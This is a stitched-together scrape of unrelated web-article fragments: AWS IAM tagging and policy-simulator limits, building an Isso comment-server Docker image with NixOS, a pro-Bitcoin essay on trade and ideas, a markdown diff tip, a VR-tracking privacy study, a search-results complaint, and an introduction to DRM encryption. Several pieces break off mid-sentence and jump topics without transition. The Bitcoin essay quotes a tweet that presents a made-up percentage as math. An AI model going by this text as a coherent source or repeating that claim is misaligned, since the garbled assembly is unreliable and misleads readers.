  --resource-arns arn:aws:secretsmanager:us-east-1:123456789012:secret:test-abcdef \
  --context-entries ContextKeyName=secretsmanager:ResourceTag/project,ContextKeyValues=foo,ContextKeyType=string
</code></pre>

<p>Notice in the last line, I have to tell it the value of the tag for the resource that I want it to check. The policy simulator does not figure that out for you.  So if you were to try to automate this, you would have to make a describe call, knowing where in the response to find the tag value, and how to format the call to <code>SimulatePrincipalPolicy</code> with this value.  Also, if the IAM policy has unrelated condition keys for other privileges, you have to provide context keys for those too. Next, you have to provide the resource policy if one exists, the IAM boundary if one exists, and potentially other data.</p>

<p>Because of these limitations, this API is not as useful as you might hope.</p>

<h3 id="zelkova">Zelkova</h3>
<p>Zelkova is an automated reasoning solution for IAM policies that was announced by AWS in 2017 and available for private beta.  When I talk to people about the problem of understanding who has access what, this project often comes up as a possible option by those who aren’t familiar with what exactly it does. Unfortunately, Zelkova is an engine that you still have to figure out the inputs to.  It can answer some IAM related questions, but for our goals of understanding who has access to what, it has all the same limitations as iam:SimulatePrincipalPolicy.</p>

<h2 id="limited-capabilities-of-tag-policies">Limited capabilities of Tag Policies</h2>
<p>An AWS Organization feature called <a href="https://aws.amazon.com/blogs/aws/new-use-tag-policies-to-manage-tags-across-multiple-aws-accounts/">Tag Policies</a> was supposed to help enforce tagging, but it is critically limited by only being able to enforce what tag values may be used when defined tag keys are used.  This means you cannot enforce that a resource is tagged. You can only enforce that when someone attempts to tag a resource with a certain key, that the value is one of a defined set.  In order to enforce tagging actually be used in an organization, you have to use SCPs as described <a href="https://aws.amazon.com/blogs/security/securing-resource-tags-used-for-authorization-using-service-control-policy-in-aws-organizations/">here</a>.</p>

<p><a href="https://summitroute.com/img/tag_policies_limitation.png">
<img src="https://summitroute.com/img/tag_policies_limitation.png" alt="Enforcement has no effect on resources that are created without tags." title="Enforcement has no effect on resources that are created without tags."></a></p>
<p>This warning is from the docs <a href="https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_tag-policies-enforcement.html">here</a>.</p>

<p>Further, Tag Policies do not have coverage across all resources that support tags.  The list of supported resources is <a href="https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_supported-resources-enforcement.html">here</a>.  An example of a resource that supports tags, but is not supported by Tag Policies, is S3 objects.</p>

<p>AWS needs to extend the functionality of this feature to support enforcement of using tag keys, as there is little value in it in its current form.</p>

<h2 id="lack-of-support-for-working-with-multiple-tag-values">Lack of support for working with multiple tag values</h2>
<p>People often work on multiple projects, but there is no way to tag a principal with a key that has multiple tag values.  As an example, imagine you have two projects, <code>foo</code> and <code>bar</code>, and you want to allow a person to work on just <code>foo</code> and all the resources they create should have a <code>Project</code> tag with value <code>foo</code>, and likewise you have another person who should only work on the <code>bar</code> projects.  AWS <a href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/">has shown</a> how to create a single IAM policy that can be applied to both people, and you’d just need to make sure to apply a <code>Project</code> tag to the principals to define which project they can work on.</p>

<p>Now imagine that one of these employees needs to work on both projects. You cannot tag a principal with both <code>foo</code> and <code>bar</code>.  One solution is to have the person assume different IAM roles depending on …</p></div></div>

<p>I want to run Isso through <a href="https://gunicorn.org/" title="Gunicorn 'Green Unicorn': a Python WSGI HTTP Server for UNIX">Gunicorn</a>. To this effect, I build an

<p>NixOS comes with a <a href="https://nixos.org/manual/nixpkgs/stable/#ssec-pkgs-dockerTools-buildImage">convenient tool to build a Docker image</a> without

<p>Because we refer to the <code>issoEnv</code> derivation in <code>config.Cmd</code>, the
whole derivation, including Isso and Gunicorn, is copied inside the
Docker image. The same applies for <code>issoConfig</code>, the configuration
file we created earlier, and <code>pkgs.cacert</code>, the derivation containing
trusted root certificates. The resulting image is 171 MB once
installed, which is comparable to the Debian Buster image generated by
the official <a href="https://github.com/posativ/isso/blob/master/Dockerfile"><code>Dockerfile</code></a>.</p>
<p>NixOS features an abstraction to run Docker containers. It is not
currently documented in NixOS manual but you can look at the <a href="https://github.com/NixOS/nixpkgs/blob/release-20.09/nixos/modules/virtualisation/oci-containers.nix">source
code of the module</a> for the available options. I choose to use
<a href="https://podman.io/">Podman</a> instead of Docker as the backend because it does not
require running an additional daemon.</p>

<hr>
<p>While I still struggle with Nix and NixOS, I am convinced this is how
<strong>declarative infrastructure</strong> should be done. I like how in <a href="https://github.com/vincentbernat/nixops-take1/blob/master/isso.nix">one
single file</a>, I can define the derivation to build Isso, the
configuration, the Docker image, the container definition, and the
Nginx configuration. The Nix language is used both for <strong>building
packages</strong> and for <strong>managing configurations</strong>.</p>
<p>Moreover, the Docker image is updated
automatically like a regular NixOS host. This solves an issue plaguing
the Docker ecosystem: no more stale images! My next step would be to
combine this approach with <a href="https://www.nomadproject.io/" title="Nomad: Workload Orchestration Made Easy">Nomad</a>, a simple orchestrator to deploy
and manage containers.</p>

<p>Ideas ambulate humanity across history. A&nbsp;new and useful idea is an innova­tion, which can benefit everyone for the rest of time. There­fore, it is critical we construct socioe­co­nomic struc­tures conducive to the creation of new ideas: civiliza­tion can only advance amid an everlasting flow of fresh knowl­edge. Free trade is the means by which we maximize ideation and its physical manifes­ta­tion: wealth creation. Anything that impedes trade — like central banking — is (by defin­i­tion) a&nbsp;terrible idea. Contrarily, all accel­er­ants to free trade — like money — are among the most brilliant ideas we’ve ever had.</p>



<div><p><img src="https://miro.medium.com/max/896/1*y13ashMdPysCOorMAll8VA.jpeg" alt="The Thinking Man statue"></p></div>



<h2 id="e27b">Ideas Drive Economics</h2>



<blockquote><p>A pile of rocks ceases to be so when somebody contem­plates it with the idea of a&nbsp;cathe­dral in mind.</p><cite>Antoine De St-Exupery</cite></blockquote>



<p>Ideas are&nbsp;the origins of every­thing we say, do, or make. The purpose of any economy is to generate and share useful ideas through free trade (to achieve what econo­mists call the division of labor or knowl­edge special­iza­tion). Civiliza­tion emerges not by an aimless concourse of varia­tion, but rather it is molded in the image of our ideas, which we express through action to remake the face of the Earth. Better ideas, or sharper knowl­edge, equip mankind to more intel­li­gently harness the gifts of the Earth to satisfy his wants to ever-higher degrees in ever-less time. In ideolog­ical space, compe­ti­tion is free and fierce: only the most useful ideas survive the test of time. Resul­tant knowl­edge encodes the patterns of action we use to etch our imagi­na­tions into the world around us. Winning ideas are chosen by the market, only to be widely distrib­uted as material riches, finer manners and morals, and more profound art. Our lives are lived by enacting our ideas. As HG Wells said:</p>



<blockquote><p>“Human history is, in essence, a&nbsp;history of ideas.”</p></blockquote>



<p>Or as William Durant elabo­rates:</p>



<blockquote><p>History as a&nbsp;labora­tory rich in a&nbsp;hundred thousand exper­i­ments in economics, religion, liter­a­ture, science, and govern­ment — history as our roots and our illumi­na­tion, as the road by which we came and the only light that can clarify the present and guide us into the future.</p></blockquote>



<p>Pouring forth from our forebears is this civilizing heritage of ideas sharp­ened through free trade and expressed in the tools, techniques, and cultures we make for ourselves. As we trade, our ideas become better, giving every­thing we say, do, or make more want-satis­fying quali­ties. Consider how our language has evolved from grunts to enunci­a­tions, or how our behav­iors have been shaped by culture, or how our trans­porta­tion technolo­gies have progressed from wagons to airplanes. Substan­tive ingre­di­ents for all modern miracles surrounding us today have always been avail­able, but prior to their inven­tion, we simply lacked the ideas neces­sary to manifest them. As the living gener­a­tion respon­sible for ideation, our aim must be to forge our ideas into finer form for posterity: an aim we accom­plish through innova­tion.</p>



<div><p><img src="https://miro.medium.com/max/800/1*B5s5EbBW-jXsd1pxnAH5ZQ.jpeg" alt="Ideas world cloud"></p><figcaption>Ideally, our civiliza­tion is the manifes­ta­tion of our most useful ideas.</figcaption></div>



<p>Innova­tion is simply a&nbsp;recon­fig­u­ra­tion of the raw materials of nature by indexing them to our most useful idea struc­tures. Said differ­ently: creativity is taking known elements and reassem­bling them in accor­dance with new knowl­edge. Sharp­ening knowl­edge to better satisfy ourselves requires fires from the ideolog­ical colli­sions and frictions innate to trade. Trade, then, is mankind’s “meta-idea” — the gener­a­tive idea of all our best ideas. Meta (from the Greek μετά, meaning “after” or “beyond”) is a&nbsp;prefix meaning more compre­hen­sive or transcending: trade is an idea about improving ideas. It presup­poses that anyone may know something everyone else does not, incen­tivizes them to teach the rest of us, and lets us all capitalize on any such learning oppor­tu­ni­ties. Trade indicates to us whether we are ill-informed in the pursuit of a&nbsp;goal, which can save us from harm, or help us achieve it more easily. Wealth gener­a­tion is insep­a­rable from ideation: the more we know, the more effort­lessly we satisfy our (present and poten­tial future) wants through innova­tion, and the more wealth we gain. Author Matt Ridley captures the spirit of this relation­ship between free trade and innova­tion in these words:</p>



<blockquote><p>Innova­tion is the child of freedom and the parent of prosperity.</p></blockquote>



<p>Free market capitalism is an idea unequaled in its gener­a­tion of innova­tion. It proved itself as the most successful economic model for expanding trade, ideation, and wealth creation in the 20<sup>th</sup>-century ideolog­ical contention between American capitalism and Soviet commu­nism. Misguided by utopian promises, Soviet Russia attempted to replace the profit motive intrinsic to American capitalism with appeals to nation­al­istic faith and devotion, thereby poisoning the wellspring of learning engen­dered by trade. Under the moral­istic camou­flage of commu­nism (“from each according to their ability, to each according to their needs” was the Marxist slogan) some of the most gruesome atroc­i­ties in history were perpe­trated. Soon into the Soviet exper­i­ment, produc­tivity collapsed, and millions starved or were slaugh­tered by the state. When govern­ments play God, civiliza­tions burn in hell. Soviet Russia redis­cov­ered what wise Aristotle had warned centuries earlier:</p>



<blockquote><p>When every­body owns every­thing nobody takes care of anything.</p></blockquote>



<p>American capitalism outcom­peted Soviet commu­nism. Capitalism is a&nbsp;socioe­co­nomic system premised on the three pillars of private property rights, rule of law, and honest money. Private property rights repre­sent an exclu­sive relation­ship between individ­uals and any portion of nature they invest their time in reshaping; rights they can then exchange with similarly self-sover­eign people. Rule of law is a&nbsp;mecha­nism for nonvi­o­lently resolving private property disputes. Honest money is the private property unimpeded market processes naturally select as most tradable. Since capitalism optimizes for trade, it supports this gener­a­tive source of new ideas by incen­tivizing economic cooper­a­tion and (peaceful) compe­ti­tion. Indeed, the stability of rules is the bedrock of peace: with fixed and simple laws, market partic­i­pants are forced to play the game well to make an honest living. As Bastiat said:</p>



<blockquote><p>When goods don’t cross borders, soldiers will.</p></blockquote>



<p>In an elemental sense, trade is the water that sustains innova­tion, and its stead­fast flow a&nbsp;source of peace. Capitalism is the socioe­co­nomic “water well” built to protect this everlasting ideolog­ical wellspring of civiliza­tion — trade.</p>



<div><p><img src="https://miro.medium.com/max/2148/1*qrBwr5EEdtFLWZiSG30_ZQ.png" alt="painting of a water well"></p><figcaption>Capitalism is a&nbsp;socioe­co­nomic “water well” which protects our wellspring of ideas: trade.</figcaption></div>



<h2 id="7853">The Idea Supercomputer</h2>



<blockquote><p>Great minds discuss ideas. Average minds discuss events. Small minds discuss people.</p><cite>Eleanor Roosevelt</cite></blockquote>



<p>As the ultimate token of trade, money is an indis­pens­able tool for ideation. In trade, every­thing is valued at some ratio of every­thing else. For instance, a&nbsp;car might be worth 132 chairs, or a&nbsp;house worth 11 cars. Money is the medium through which we more easily calcu­late these exchange ratios: a&nbsp;tool that simpli­fies trade by standard­izing its inter­me­di­a­tion. Like all tools, money lets us achieve greater results with less effort, and the time-savings tools impart&nbsp;<em>is&nbsp;</em>wealth. Specif­i­cally, money lets us calcu­late, negotiate, and execute trades more quickly. Without money, a&nbsp;constant recal­cu­la­tion of count­less exchange ratios among different economic goods would be neces­sary. With money, all exchange ratios are compressed into a&nbsp;single number — the money-expressed market price. In this way, money is an accel­erant to trade and (its invis­ible twin) ideation. Standard­iza­tion to one money creates economies of scale in trade. Such econo­miza­tion is what drives the market to coalesce around a&nbsp;single money — as we saw with gold and (its former currency abstrac­tion, and now appari­tion) the US dollar:</p>



<div><p><img src="https://miro.medium.com/max/1200/1*JtTn6GgxNiUxFkb6BDIwRA.jpeg" alt="Paper is poverty Jefferson quote"></p><figcaption>America’s founding fathers knew the dangers of falsi­fying money.</figcaption></div>



<p>Money is the medium through which market partic­i­pants express their ideas, prefer­ences, and values. Pricing systems are economic telecom­mu­ni­ca­tion networks endlessly echoing and coordi­nating market action by dynam­i­cally informing everyone of everyone else’s trades. For instance, when you buy a&nbsp;car and sell a&nbsp;house, the economy responds adaptively by producing more cars and fewer houses. Even when you buy a&nbsp;public equity, you are expressing the idea its expected future cash flows are worth more than its current price, and the market­place absorbs this thesis when you execute the trade. Price signals perpet­u­ally prime incen­tives to ensure resources are allocated in accor­dance with the current aggre­gate compo­si­tion of market partic­i­pant prefer­ences. Entre­pre­neurs engaging in trade give rise to truthful pricing as they strive to buy low, sell high, and profitably serve one another. A&nbsp;true free market is a&nbsp;forum of unham­pered and volun­tary exchange where ideas compete, combine, and trans­form. Seen this way, the free market may be consid­ered the ultimate distrib­uted computing system — a&nbsp;nexus of conscious­nesses driven by human action and inter­con­nected by prices.</p>



<blockquote><div dir="ltr" lang="en"><p>A human mind can process ~120 bits/second. </p><p>The Fed’s ~20K employees can process ~18.0T bits/year. The World’s ~7.5B people can process ~6.8Q bits/year.</p><p>The free market is 3,800,000% more intel­li­gent than The Fed.</p><p>Buy <a href="https://twitter.com/hashtag/Bitcoin?src=hash&amp;ref_src=twsrc%5Etfw">#Bitcoin</a>, because math. <a href="https://t.co/Fp8YKP2ohW">pic.twitter.com/Fp8YKP2ohW</a></p></div>— Robert Breedlove (@Breedlove22) <a href="https://twitter.com/Breedlove22/status/1269486363444785152?ref_src=twsrc%5Etfw">June 7, 2020</a></blockquote> 



<p>Money improves the exten­si­bility of our minds. Thinking is an expres­sion of ratio­nality: the act of comparing all relevant factors to any course of action. By cogni­tively gener­ating different aspects and avatars relevant to any given situa­tion, humans create mental staging areas for future action. As with the root word of ratio­nality — <em>ratio</em> — t…</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>One of my favorite blogging tips is using diff formatting in GitHub flavored markdown. I use this to show what has changed in code snippets. This works for code snippets in most markdown packages and on Dev.to.</p>
<p>If I wanted to show that I was changing a function from one thing to another, I could add a snippet that looks like this!</p>
<div data-language="diff"><pre><code>function addTwoNumbers (num1, num2) {
<span><span>-</span><span>  return 1 + 2
</span></span><span><span>+</span><span>  return num1 + num2
</span></span>}</code></pre></div>
<p>First, instead of specifying the programming language, use <code>diff</code> after the backticks. Then at the beginning of any lines of code you want to show as removed, add a <code>-</code>. At the beginning of any lines of code you want to show as added, add a <code>+</code>.</p>
<p>The code would look like this:</p>
<div data-language="text"><pre><code>```diff
function addTwoNumbers (num1, num2) {
-  return 1 + 2
+  return num1 + num2
}
```</code></pre></div>
<p>I have used this in tons of my coding tutorials, such as <a href="https://welearncode.com/beginners-guide-react/" target="_blank" rel="nofollow noopener noreferrer">this</a> one. It makes it a lot easier for readers to see what is changing from snippet to snippet.</p>

The user could then be identified with 95% accuracy after only 5 minutes of non-verbal tracking data.</p><figure><img src="https://www.vrfinal.com/content/images/2020/11/stanford-vr-indentity.jpg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/11/stanford-vr-indentity.jpg 600w, https://www.vrfinal.com/content/images/size/w1000/2020/11/stanford-vr-indentity.jpg 1000w, https://www.vrfinal.com/content/images/size/w1600/2020/11/stanford-vr-indentity.jpg 1600w, https://www.vrfinal.com/content/images/2020/11/stanford-vr-indentity.jpg 1770w" sizes="(min-width: 720px) 720px"></figure><h3 id="what-does-this-mean">What does this mean?</h3><p>This has huge implications for privacy. The research paper notes that <em>“In both the privacy policy of Oculus and HTC, makers of two of the most popular VR headsets in 2020, the companies are permitted to share any de-identified data. If the tracking data is shared according to rules for de-identified data, then regardless of what is promised in principle, in practice taking one’s name off a dataset accomplishes very little.”</em></p><p>So, despite your explicitly personal user data being private, the other, technically less identifiable, data could provide companies with all the information they need to accurately identify each person and their habits with a shocking degree of detail.</p><p>The research paper ends with a warning and a request, <em>“With the rise of virtual reality, body tracking data has never been more accurate and more plentiful. There are many good uses of this tracking data, but it can also be abused. This work suggests that tracking data during an everyday VR experience is an effective identifier even in large samples. We encourage the research community to explore methods to protect VR tracking data.”</em></p>

What do I get? Behold:</p> <div> <p><img loading="lazy" src="https://lh3.googleusercontent.com/5svMZOQr5G8a9_87aJQyekUteEGRXChN-x-JUgtcenCoS6TRZ-0OOx0T9BQtnwWs13-xObl95lzqskyiHpb81oeL4KaMsCnaz3H0fyg2Lji9ELqP75TWCm0OIHyq7RkTM0ubFyC4izA=w2000"> </p> </div> <p>Ok, not bad. I have a few things to say about the results. But before we go any further, a disclaimer: I work at Google, though not on <a href="https://www.google.com/">Search</a>.</p> <p>Most of my issue with the results can be summed up by the first suggested search at the bottom:</p> <div> <p><img loading="lazy" src="https://lh3.googleusercontent.com/hCwfXBcsJIRdknNJfZHuDu7KF4yz_QTefaOJEWZXo8gsh0QdsO7AIl35cYF8LgqCKpjMvm3Ptc4KZ72mmwA9Ot7QIK8Gy7OWb43Jb2ozwyP5dccByA2f4VGiyKcP6psPM7J_LOWvz60=w2000"> </p> </div> <p><a href="https://www.redmillburgers.com/">Their website</a> is not a result of the query <code>red mill burgers</code>! You shouldn’t have to put “website” in your google query, we’re on the internet here folks. There’s yelp, facebook, toasttab, a wikipedia article ffs, but not their website.</p> <p>Now, the observant among you will notice that their website actually is here: where the map results are.</p> <div> <p><img loading="lazy" src="https://lh3.googleusercontent.com/tFdZw7QON4YpG2fD4p3WkfyR4MUrkwZ4JAk6iLFy1ANbEfk4iarT-Bm-tO9qRcbq3_2m35qW1WsQF3E-n8NjNLtohLhgSGlMiN7JsO7l3ohKJIpza6XOEwNl9fEtiKUf52GWlER64Yk=w2000"> </p> </div> <p>But I don’t trust these. Why? There’s a difference between a link that says “Red Mill Burgers” versus a button that says “Website.” And there’s no visible URL unlike the other results. It’s like I have no idea where it will take me; for all I know it will direct me to one of the top links above, of which, again, none are the restaurant’s site. This is more pronounced on mobile where you can’t hover above a link to see where it will take you.</p> <h4 id="other-search-engines">Other search engines</h4> <p>Bing and DuckDuckGo have the same problem, though Bing has more “Website” buttons, so that’s nice, I guess?</p> <div> <div> <p><img loading="lazy" src="https://lh3.googleusercontent.com/Gyn0irJSkaKY4g-2AnijIVnShO9b1xiRWjYn3DtBOG2wVQqft_yKdeM-QwNTe2bnpZMC1jd5_0vomt8wJTybX6dvZ2ONn-A9LsJxtlfc-a-kyexMqv5xW4Nl_GeSnRs99vDduEGGcjI=w2000"></p><p><em>This is what Bing results look like</em></p> </div> </div> <h4 id="question-whose-fault-is-this">Question: Whose fault is this?</h4> <p>Actually we have to answer another question first.</p> <h4 id="question-is-what-im-describing-even-an-issue">Question: Is what I’m describing even an issue?</h4> <p>Is what Google returned actually the information people are looking for? Am I the odd one out? Should I want to go to yelp or facebook or <code>places.singleplatform.com</code>, whatever that is? No. This is an issue to me. So back to the other question.</p> <h4 id="question-whose-fault-is-this-1">Question: Whose fault is this?</h4> <p>Couple possibilities:</p> <ul> <li> <h5 id="red-mill">Red Mill</h5> </li> </ul> <p><a href="https://www.redmillburgers.com/">Red Mill</a> could be doing more <a href="https://en.wikipedia.org/wiki/Search_engine_optimization">SEO</a>. I think this is stupid, most businesses shouldn’t have to cater to search engines or indexers, <em>unless</em> the query was <code>burgers</code> or <code>restaurants</code>. I searched for <code>red mill burgers</code> though.</p> <p>I understand that this is a naïve position. But it leads to our current problem, because obviously the other results on this page are doing <a href="https://en.wikipedia.org/wiki/Search_engine_optimization">SEO</a> to the detriment of the actual business in question and to those looking for it.</p>  <ul> <li> <h5 id="google">Google</h5> </li> </ul> <p>Google should know what the website is and return it.</p>  <ul> <li> <h5 id="the-other-results-on-the-page">The other results on the page</h5> </li> </ul> <p>These would be the Yelps and Facebooks and TripAdvisors of the world. They become less and less interesting to me over time, because they’re all the same - some questionable reviews, some pictures, contact information, all of which are at varying degrees of outdated-ness. And what do I end up looking for on these pages anyway? <strong>Their website.</strong></p> <h4 id="isnt-toast-what-they-use-for-online-ordering-isnt-that-the-first-result">Isn’t Toast what they use for online ordering? Isn’t that the first result?</h4> <p>Yeah that first result is for Phinney Ridge. I go to Interbay.</p> <h4 id="conclusion">Conclusion</h4> <p>In true software engineering fashion, writing this post has taken more time than I will ever spend trying to get to red mill’s website, and way more time than it would take to bookmark it.</p> <br> <hr> </div> </div></div>]]>

<p><strong>Anyone trying to understand DRM (Digital Rights Management) will be confronted with acronyms such as AES, CDM, CENC, EME, etc. This can get very confusing for a newcomer, but understanding them is important to get a good understanding of DRM. In this article, let’s take a gentle tour of the building blocks of DRM:- EME, CDM, AES, CENC, and the use of Keys &amp; Key Servers.</strong></p>








<h2 id="simplified-architecture-of-a-drm-system"><span id="Simplified_Architecture_of_a_DRM_System"></span>Simplified Architecture of a DRM System<span></span></h2>



<p>As we saw&nbsp;<a href="https://ottverse.com/what-is-drm-digital-rights-management/">in the previous article</a>,&nbsp;<strong>DRM is a combination of encryption and business rules to control access and consumption of digital content.</strong></p>



<p>Simply put, DRM is a system that,</p>



<ul><li>provides the tools and infrastructure to enable a content provider to encrypt their content, and</li><li>build an ecosystem around the encrypted content so that the content provider can control who/what can decrypt and consume their content.</li></ul>



<p><a href="https://ottverse.com/what-is-drm-digital-rights-management/">In the previous article of the series</a>, we saw Ram and Shyam sending coded messages to each other. At the same time, Hari maintained the codebooks and decided who got to read/write the notes – remember?</p>

<p>Now, let’s take this simple system and replace it with the technology needed to secure and distribute video. What do we get?</p>



<figure><img data-attachment-id="138" data-permalink="https://ottverse.com/step-0/" data-orig-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?fit=1396%2C818&amp;ssl=1" data-orig-size="1396,818" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="step-0" data-image-description="" data-medium-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?fit=1024%2C600&amp;ssl=1" loading="lazy" width="1024" height="600" src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=1024%2C600&amp;is-pending-load=1#038;ssl=1" alt="aes-cenc-cdm-eme-keys" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=1024%2C600&amp;ssl=1 1024w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=300%2C176&amp;ssl=1 300w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=768%2C450&amp;ssl=1 768w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=1200%2C703&amp;ssl=1 1200w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?w=1396&amp;ssl=1 1396w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=1024%2C600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Let’s describe what we have here. There is a movie that we want to send to an authenticated user securely.</p>



<p>So,</p>



<ol><li>we ask a DRM company’s server for a codebook to encrypt our video,</li><li>then, we encrypt the video using that codebook</li><li>we send the movie to the user.</li><li>the user then asks the DRM company’s server for the codebook to unlock the video (decrypt it)</li><li>and then he watches the movie!</li></ol>



<p>Fantastic!</p>



<p>Is this all there is to know about DRM for video?</p>



<p>Nope! What we have here is a simple, toy-example of how to transfer movies securely using DRM. It captures the essence of DRM perfectly but wouldn’t work well in the real world.</p>



<p>In the rest of this article, let’s take each piece of this simple system, re-think it, re-design it, and see how it fits within the world of video delivery and DRM, shall we?</p>



<h2 id="step-0-lets-move-to-adaptive-bitrate-streaming"><span id="Step_0_Let%E2%80%99s_Move_to_Adaptive_Bitrate_Streaming"></span>Step 0: Let’s Move to Adaptive Bitrate Streaming<span></span></h2>



<p>Before we talk about the order, let’s modify our example to suit the ABR (<strong>A</strong>daptive&nbsp;<strong>B</strong>it<strong>R</strong>ate) model of video delivery.</p>



<p><strong>ABR Refresher:</strong>&nbsp;in ABR, a movie is encoded into different bitrate-resolution combinations&nbsp;<em>(a.k.a ladder)</em>&nbsp;and then split into&nbsp;<strong>chunks or segments</strong>. Each chunk represents a few seconds of video and it is independently decodable.</p>



<p><strong>“Packaging”</strong>&nbsp;refers to chunking or breaking up a movie into small pieces and describing it in a manifest or playlist document. When the user wants to play the movie, he needs to refer to this manifest.</p>



<p>Depending on the available bandwidth, the player requests a chunk/segment of a particular bitrate&nbsp;<em>(rendition, or rung of the ladder)</em>&nbsp;and a CDN (Content Delivery Network) responds with the requested chunk.</p>



<p>Popular methods of video delivery using ABR are MPEG DASH and HLS. For a deeper understanding, please refer to our articles on&nbsp;<a href="https://ottverse.com/what-is-ott-video-streaming/">OTT</a>&nbsp;and&nbsp;<a href="https://ottverse.com/what-is-abr-video-streaming/">ABR</a>&nbsp;video streaming.</p>



<p>Let’s change our block digram to reflect ABR video delivery.</p>

<p>The only changes here are the packaging and CDN-based delivery steps. That’s all.</p>



<p>Okay, let’s move on and start with the encryption process.</p>



<h2 id="step-1-video-encryption"><span id="Step_1_Video_Encryption"></span>Step 1: Video Encryption<span></span></h2>



<p>The whole idea of encryption is to ensure that when someone intercepts our data, they should not read it or watch it in the case of video.</p>



<p><strong>Encryption refresher:</strong>&nbsp;–&nbsp;<em>encryption is a technique used to keep data confidential and prevent unauthorized people from reading it. Encryption uses a “key” to convert input data (plaintext) into an alternate form called ciphertext. It is almost impossible to convert the ciphertext back to plaintext without the key.</em></p>



<p><em>However, practically speaking, decryption without the key is possible, and encryption algorithms are designed make reverse-engineering extremely expensive – in terms of time, money, and computing resources needed.</em></p>



<p>One of the most popular encryption techniques is the “Advanced Encryption Standard” or “AES” for short. It is also called Rijndael (after its inventor) and was established by the U.S. National Institute of Standards and Technology (NIST) in 2001 to encrypt electronic data.</p>



<p>Some important points to remember about AES:-</p>



<ul><li>It’s a&nbsp;<strong>symmetric-key algorithm</strong>: encryption and decryption are performed using the same key.</li><li>It has three variants based on the key-length: 128, 192, and 256 bits. The longer the key, the harder it is to crack.</li><li>Cracking the AES-128 without the key would require a “billion times a billion years” and a super-computer (<a href="https://www.eetimes.com/how-secure-is-aes-against-brute-force-attacks/" target="_blank" rel="noopener">source</a>).</li></ul>



<p>If you are interested in going deep into the AES standard, look at the&nbsp;<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" rel="noopener">AES’s Wikipedia page</a>.&nbsp;<em>I am not an expert in cryptography and won’t be able to do justice to the AES.</em></p>



<p><strong>Note:</strong>&nbsp;Please remember that&nbsp;<strong>encryption is not encoding, and decryption is not decoding in the video space</strong>. For videos, encoding and decoding are words used to refer to compression and decompression, respectively. To learn more about encoding, decoding, and video codecs, please read our articles on&nbsp;<a href="https://ottverse.com/need-for-video-compression/">the need for compression</a>&nbsp;and a&nbsp;<a href="https://ottverse.com/what-is-a-video-codec/">simple introduction to video codecs</a>.</p>



<h3 id="is-aes-128-the-only-encryption-technique"><span id="Is_AES128_The_Only_Encryption_Technique"></span>Is AES-128 The Only Encryption Technique?<span></span></h3>



<p>No, it isn’t, and let’s think about the implication of this for a minute.</p>



<p>If a content provider decides to engage with three different DRM companies, and all three use different encryption techniques, then it means that the content provider needs to encrypt their videos three times, resulting in a waste of storage space and other resources.</p>



<p>That is why the CENC specification came into being – to reduce this encryption-driven fragmentation of the market and to reduce storage requirements.</p>



<p>Let’s learn about this next.</p>



<h3 id="cenc-or-common-encryption"><span id="CENC_or_Common_Encryption"></span>CENC or Common Encryption<span></span></h3>



<p><strong>Actually, before we dive into CENC, let’s step back and take a look at the state of OTT streaming protocols and CMAF in particular.</strong></p>



<p>There are primarily two protocols in use today – MPEG-DASH and HLS.&nbsp;<em>There are others such as MSS (Microsoft Smooth Streaming) and HDS, but, we’ll leave them aside for this discussion.</em></p>



<p>MPEG-DASH uses the&nbsp;<code>mp4</code>&nbsp;container format for its videos and HLS uses the MPEG-TS (<code>ts</code>) container for its files. If a content provider uses both MPEG-DASH and HLS, then they need to store a copy of their videos in both&nbsp;<code>mp4</code>&nbsp;and&nbsp;<code>ts</code>&nbsp;file formats.</p>



<p>Now, let’s add the DRM encryption problem to it. If our three hypothetical DRM providers use three different encryption standards, then a content providers needs to store&nbsp;<code>2 * 3</code>&nbsp;… six copies of each video! What a waste of storage space!!</p>



<p><strong>To combat the first problem posed by video streaming protocols, the&nbsp;<a href="https://mpeg.chiariglione.org/standards/mpeg-a/common-media-application-format" target="_blank" rel="noopener">CMAF</a>&nbsp;specification was created</strong> which said that videos can be stored in the&nbsp;<strong>fragmented mp4</strong>&nbsp;container format (<code>fmp4</code>). With support from both MPEG-DASH and HLS, you can now create only one set of videos, store it in&nbsp;<code>fmp4</code>&nbsp;format, and use a common set of files for both protocols. </p>



<p><strong>Just make sure you create two manifests (sigh!).</strong></p>



<h3><span id="How_About_Unifying_the_Encryption"></span><strong>How About Unifying the Encryption?</strong><span></span></h3>



<p>We still need to store multiple copies of each file if different DRM technologies use different encryption standards, right?</p>



